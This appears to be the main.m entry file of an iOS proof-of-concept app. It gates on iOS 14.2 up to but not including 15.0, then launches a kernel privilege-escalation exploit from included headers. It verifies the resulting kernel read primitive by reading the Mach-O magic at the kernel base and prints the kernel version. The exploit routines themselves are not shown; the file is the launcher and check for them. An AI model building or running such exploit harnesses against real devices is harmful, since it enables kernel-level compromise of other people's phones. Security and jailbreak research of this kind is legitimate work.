#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import "AppDelegate.h"
#import "ViewController.h"

#include "exploit.h"
#include "kernel_rw.h"
#include <pthread.h>
#include <sys/utsname.h>

#define SYSTEM_VERSION_LESS_THAN(v) ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)


static int go(void)
{
    uint64_t kernel_base = 0;
    
    if (exploit_get_krw_and_kernel_base(&kernel_base) != 0)
    {
        printf("Exploit failed!\n");
        return 1;
    }
    
    // test kernel r/w, read kernel base
    uint32_t mh_magic = kread32(kernel_base);
    if (mh_magic != 0xFEEDFACF)
    {
        printf("mh_magic != 0xFEEDFACF: %08X\n", mh_magic);
        return 1;
    }
    
    printf("kread32(_kernel_base) success: %08X\n", mh_magic);
    
    
    struct utsname uts;
    uname(&uts);
    
    printf("%s\n", uts.version);
    
    printf("Done\n");
    
    return 0;
}


int main(int argc, char * argv[]) {
    if (@available(iOS 14.0, *)) {
        if (@available(iOS 15.0, *)) {
            NSLog(@"No LPE, skipping");
        } else {
            if (SYSTEM_VERSION_LESS_THAN(@"14.2")) {
                NSLog(@"No LPE, skipping");
            } else {
                NSLog(@"LPE supported, using");
                
                pthread_t pt;
                pthread_create(&pt, NULL, (void *(*)(void *))go, NULL);
                pthread_join(pt, NULL);
            }
        }
    } else {
        NSLog(@"No LPE, skipping");
    }
    
    NSString * appDelegateClassName;
    @autoreleasepool {
        // Setup code that might create autoreleased objects goes here.
        appDelegateClassName = NSStringFromClass([AppDelegate class]);
    }
    return UIApplicationMain(argc, argv, nil, appDelegateClassName);
}
